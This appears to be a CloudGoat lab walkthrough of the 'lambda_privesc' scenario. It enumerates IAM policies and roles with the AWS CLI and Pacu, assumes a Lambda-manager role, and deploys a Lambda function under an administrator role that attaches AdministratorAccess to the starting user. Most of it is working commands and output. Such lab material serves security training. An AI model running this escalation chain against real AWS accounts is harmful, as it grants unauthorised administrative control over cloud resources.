Goal - Acquire full admin privileges.
```zsh
cloudgoat config whitelist --auto
cloudgoat create lambda_privesc

aws configure --profile chris
aws sts get-caller-identity --profile chris | jq
#username chris-cgidgiq8sl4d1z

aws --profile chris iam list-user-policies --user-name chris-cgidgiq8sl4d1z
#empty
aws --profile chris iam list-attached-user-policies --user-name chris-cgidgiq8sl4d1z
#arn:aws:iam::266877689244:policy/cg-chris-policy-cgidgiq8sl4d1z

aws --profile chris iam get-policy --policy-arn arn:aws:iam::266877689244:policy/cg-chris-policy-cgidgiq8sl4d1z
#default v1
aws --profile chris iam get-policy-version --policy-arn arn:aws:iam::266877689244:policy/cg-chris-policy-cgidgiq8sl4d1z --version-id v1
"Action": [
                        "sts:AssumeRole",
                        "iam:List*",
                        "iam:Get*"
                        "Effect": "Allow",
                        ],
                    "Resource": "*",
                    "Sid": "chris"
#There's assume role, but no SetDefault version.
#So we enumerate roles
```

optional pacu enum
```zsh
pacu
import_keys chris
set_regions us-east-1

run iam__enum_users_roles_policies_groups
data iam roles
#2 non-default aws roles
arn:aws:iam::266877689244:role/cg-debug-role-cgidgiq8sl4d1z
arn:aws:iam::266877689244:role/cg-lambdaManager-role-cgidgiq8sl4d1z
```

```zsh
#first list the roles
aws --profile chris iam list-roles
#2 non-default aws roles
arn:aws:iam::266877689244:role/cg-debug-role-cgidgiq8sl4d1z
arn:aws:iam::266877689244:role/cg-lambdaManager-role-cgidgiq8sl4d1z

#list the policies attached to the roles
aws iam --profile chris list-attached-role-policies --role-name cg-debug-role-cgidgiq8sl4d1z
"PolicyName": "AdministratorAccess",
"PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
            
aws iam --profile chris list-attached-role-policies --role-name cg-lambdaManager-role-cgidgiq8sl4d1z
"PolicyName": "cg-lambdaManager-policy-cgidgiq8sl4d1z",
"PolicyArn": "arn:aws:iam::266877689244:policy/cg-lambdaManager-policy-cgidgiq8sl4d1z"

#enum the actual policies associate with the roles
#cg-debug
aws iam --profile chris get-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
		"DefaultVersionId": "v1",
        "IsAttachable": true,
        "Description": "Provides full access to AWS services and resources."
aws iam --profile chris get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1
		"Effect": "Allow",
        "Action": "*",
        "Resource": "*"

#lambda manager
aws --profile chris iam get-policy --policy-arn arn:aws:iam::266877689244:policy/cg-lambdaManager-policy-cgidgiq8sl4d1z
		"DefaultVersionId": "v1",
        "IsAttachable": true,
        "Description": "cg-lambdaManager-policy-cgidgiq8sl4d1z",
aws iam --profile chris get-policy-version --policy-arn arn:aws:iam::266877689244:policy/cg-lambdaManager-policy-cgidgiq8sl4d1z --version-id v1
"Action": [
		"lambda:*",
        "iam:PassRole"
```
This policy grants unrestricted access to all AWS Lambda operations, meaning the entity can create, modify, delete, and invoke Lambda functions. It also allows the entity to pass any IAM role to Lambda, potentially escalating privileges by attaching a role with higher permissions to a Lambda function.

Privesc by assuming role as lambda manager. When we assume a role, it will generate temporary credentials for us. These credentials will provide us with the same permissions as the role
```zsh
aws --profile chris sts assume-role --role-arn arn:aws:iam::266877689244:role/cg-debug-role-cgidgiq8sl4d1z --role-session-name rs1
#is not authorized to perform: sts:AssumeRole on resource

aws --profile chris sts assume-role --role-arn arn:aws:iam::266877689244:role/cg-lambdaManager-role-cgidgiq8sl4d1z --role-session-name rs2
#This gives us access_id, secret_id, session key.

aws configure --profile woz
aws sts get-caller-identity --profile woz
```

Since we have the ability to create Lambda functions, and the Lambda functions are able to assume AdministratorAccess, we can create a LambdaFunction that assigns administrative access to our user.

To create the lambda function, you need to create a file called `lambda_function.py` with the code below. By default, AWS Lambda’s Python runtime expects the handler in a file named lambda_function.py with a handler function called lambda_handler.

```python
#vi lambda_function.py
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    response = iam.attach_user_policy(
        UserName='chris-cgidgiq8sl4d1z',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

```zsh
zip -r lambda_function.py.zip lambda_function.py

#creating the lambda function
aws lambda create-function --function-name admin_function --runtime python3.9 --role arn:aws:iam::266877689244:role/cg-debug-role-cgidgiq8sl4d1z --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile woz

#running the lambda function
aws --profile woz lambda invoke --function-name admin_function out.txt 
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

#verify
aws --profile chris iam list-attached-user-policies --user-name chris-cgidgiq8sl4d1z
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-cgidgiq8sl4d1z",
            "PolicyArn": "arn:aws:iam::266877689244:policy/cg-chris-policy-cgidgiq8sl4d1z"
        },
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```